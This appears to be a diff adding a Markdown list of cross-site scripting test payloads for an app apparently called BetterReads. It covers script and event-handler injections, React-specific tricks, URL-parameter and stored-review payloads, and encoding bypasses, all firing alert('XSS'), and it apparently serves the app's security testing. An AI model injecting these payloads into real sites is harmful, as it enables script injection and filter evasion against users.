@@ -1,0 +1,35 @@
+# XSS Test Payloads for BetterReads
+
+## Basic XSS Payloads
+<script>alert('XSS')</script>
+<img src="x" onerror="alert('XSS')">
+<body onload="alert('XSS')">
+<svg onload="alert('XSS')">
+<iframe src="javascript:alert('XSS')">
+<a href="javascript:alert('XSS')">Click me</a>
+
+## React-Specific XSS Payloads
+{/* React comment with JS */}
+{`${alert('XSS')}`}
+{eval('alert("XSS")')}
+<div dangerouslySetInnerHTML={{__html: "<script>alert('XSS')</script>"}} />
+
+## Event Handler Payloads
+<div onClick="alert('XSS')">Click me</div>
+<input value="XSS" onFocus="alert('XSS')" autofocus>
+<button onmouseover="alert('XSS')">Hover me</button>
+
+## URL Parameter Payloads
+?search=<script>alert('XSS')</script>
+?q=<img src=x onerror=alert('XSS')>
+?redirect=javascript:alert('XSS')
+
+## Stored XSS Payloads (for reviews/comments)
+Nice book! <script>alert('XSS')</script>
+I enjoyed reading this. <img src="x" onerror="alert('XSS')">
+Great story! <svg onload="alert('XSS')"></svg>
+
+## Encoding Bypass Payloads
+%3Cscript%3Ealert('XSS')%3C/script%3E
+<scr<script>ipt>alert('XSS')</script>
+&#x3C;script&#x3E;alert(&#x27;XSS&#x27;)&#x3C;/script&#x3E;
